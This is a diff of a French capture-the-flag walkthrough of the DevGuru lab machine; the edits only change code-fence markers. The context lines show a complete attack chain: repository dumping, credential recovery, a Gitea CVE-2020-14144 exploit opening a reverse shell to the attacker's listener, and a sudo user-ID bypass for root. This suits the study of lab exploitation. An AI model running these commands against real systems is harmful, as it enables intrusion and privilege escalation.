@@ -10,7 +10,7 @@ Dirty Little Secret
 
 J'ai suivit mon intuition tout au long de ce CTF mais je me suis parfois demandé si je n'était pas sur une piste inattendue. La lecture d'autres writeup après la résolution du CTF m'a montré qu'il s'agissait bien du bon chemin même si mes actions ont parfois légèrement divergé.  
 
-```plain
+```
 $  sudo nmap -sCV -p- -T5 192.168.56.20 
 [sudo] Mot de passe de root :  
 Starting Nmap 7.92 ( https://nmap.org )
@@ -86,7 +86,7 @@ J'avoue que je n'ai même pas cherché à étudier la piste du *Gitea* (sur le p
 
 J'ai pour le coup sauté sur [git-dumper](https://github.com/arthaud/git-dumper), j'ai utilisé un autre soft du même type par le passé mais celui ci est de bonne qualité.  
 
-```plain
+```
 $ python git-dumper.py http://192.168.56.20/.git/ website
 ```
 
@@ -94,7 +94,7 @@ Cet utilitaire télécharge récursivement les fichiers dans le dossier *.git*, 
 
 Ce répo ne dispose que d'un seul commit :  
 
-```plain
+```
 $ git log
 commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -> master, origin/master) 
 Author: frank <frank@devguru.local> 
@@ -143,19 +143,19 @@ Il fallait alors déterminer où se trouve la page de login sur le CMS. J'ai reg
 L'accès obtenu sur le CMS permet de jouer sur la configuration. Les autres personnes ayant résolu le CTF se sont dirigés vers le mécanisme de *Markup* des pages qui disposait d'un onglet *Code* que je n'ai pas remarqué.
 J'ai d'abord tenté d'uploader un fichier via la section des assets :  
 
-```plain
+```
 Error uploading file 'shell.php5': Only the following file types are allowed: jpg, jpeg, bmp, png, webp, gif, ico, css, js, woff, woff2, ttf, eot, json, md, less, sass, scss, xml
 ```
 
 Ensuite via la section des contenus :  
 
-```plain
+```
 Invalid file extension: php5. Allowed extensions are: htm, txt, md.
 ```
 
 Et finalement via les médias :  
 
-```plain
+```
 The file type used is blocked for security reasons.
 ```
 
@@ -174,7 +174,7 @@ So good I did it twice
 
 Une fois un shell interactif récupéré il n'y a rien qui me saute aux yeux. On peut toutefois lister les fichiers de l'utilisateur *frank* sur le système :  
 
-```plain
+```
 $ find / -user frank -ls | grep -v /proc/
    656007      4 drwxr-xr-x   7 frank    frank        4096 Nov 19  2020 /var/lib/gitea
    662525      4 drwxr-xr-x   2 frank    frank        4096 Nov 19  2020 /var/lib/gitea/custom
@@ -191,7 +191,7 @@ $ find / -user frank -ls | grep -v /proc/
 
 Le fichier de backup semble une piste crédible :  
 
-```plain
+```
 [database]
 ; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
 DB_TYPE             = mysql
@@ -206,7 +206,7 @@ Mais ce mot de passe ne permet pas d'accéder au compte *frank* via su, ni même
 
 Retour sur *Adminer* donc pour étudier la base SQL *gitea*. Il y a un compte frank enregistré sur l'appli :  
 
-```plain
+```
 INSERT INTO `user` (`id`, `lower_name`, --- snip ---
 VALUES (1,     'frank',        'frank',        '',     'frank@devguru.local',  0,      'enabled',
 'c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900', 'pbkdf2',0
@@ -217,7 +217,7 @@ pbkdf2... oh je passe mon tour pour casser ça. Faut-il là encore insérer un n
 
 Je met ici l'extrait du Yaml qui pourra aider si la référence est retirée d'Internet :  
 
-```plain
+```
  # NOTE: all users should have a password of "password"
 
 - # NOTE: this user (id=1) is the admin
@@ -244,7 +244,7 @@ Cette version est vulnérable [à cet exploit](https://www.exploit-db.com/exploi
 
 L'exploit n'a pas fonctionné au début car l'URL passée en paramètre ne veut pas de slash final ou plutôt le serveur n'aime pas qu'il y ait deux slashs :  
 
-```plain
+```
 $ curl -I http://192.168.56.20:8585//user/login 
 HTTP/1.1 404 Not Found 
 Content-Type: text/html; charset=UTF-8 
@@ -266,7 +266,7 @@ Date: Wed, 02 Feb 2022 02:02:25 GMT
 
 J'ai remarqué cela avec Wireshark mais qu'importe une fois que l'on connait le truc :  
 
-```plain
+```
 $ python gitea.py -v -t http://192.168.56.20:8585 -u frank -p password -I 192.168.56.1 -P 9999  
     _____ _ _______ 
    / ____(_)__   __|             CVE-2020-14144 
@@ -339,7 +339,7 @@ searcher: searcher_re:
 
 et sur le Ncat préalablement mis en écoute :  
 
-```plain
+```
 $ ncat -v -l -p 9999 
 Ncat: Version 7.92 ( https://nmap.org/ncat ) 
 Ncat: Listening on :::9999 
@@ -358,7 +358,7 @@ Je m’empresse de rajouter ma clé publique SSH au fichier *.ssh/authorized key
 unsigned int
 ------------
 
-```plain
+```
 frank@devguru:~$ cat user.txt  
 22854d0aec6ba776f9d35bf7b0e00217
 frank@devguru:~$ sudo -l 
@@ -375,7 +375,7 @@ sqlite3 dispose d'une commande *.system* pour exécuter des commandes mais si je
 
 J'ai noté des dossiers sous */data* liés à un utilisateur manquant. J'ai donc fouillé dans ce sens :  
 
-```plain
+```
 frank@devguru:~$ ls -ld /data/backups/ 
 drwx------ 2 998 root 4096 Nov 18  2020 /data/backups/
 
@@ -392,7 +392,7 @@ drwxr-xr-x 20 root root 4096 Nov 18  2020 ..
 
 Il y avait d'autres dossiers mais rien d'intéressant. J'ai ensuite regardé l'utilisateur *syslog* car il dispose de droits sur */var/log/auth.log*. J'ai juste trouvé ceci :  
 
-```plain
+```
 Nov 19 02:27:34 corp sudo:    frank : TTY=pts/0 ; PWD=/root ; USER=root ;
     COMMAND=/usr/local/bin/gitea admin create-user --username frank --password 52QCem2uwtGLHEVQ --email frank@corp.local -c /etc/gitea/app.ini
 ```
@@ -401,7 +401,7 @@ Heureusement je me rappelais vaguement d'une faille pour sudo ou sudoedit [où l
 
 En regardant la description de l'exploit on comprends qu'il s'agit exactement de cette situation, c'est donc la solution attendue :  
 
-```plain
+```
 frank@devguru:~$ sudo -u \#-1 /usr/bin/sqlite3   
 SQLite version 3.22.0 2018-01-22 18:45:57 
 Enter ".help" for usage hints. 
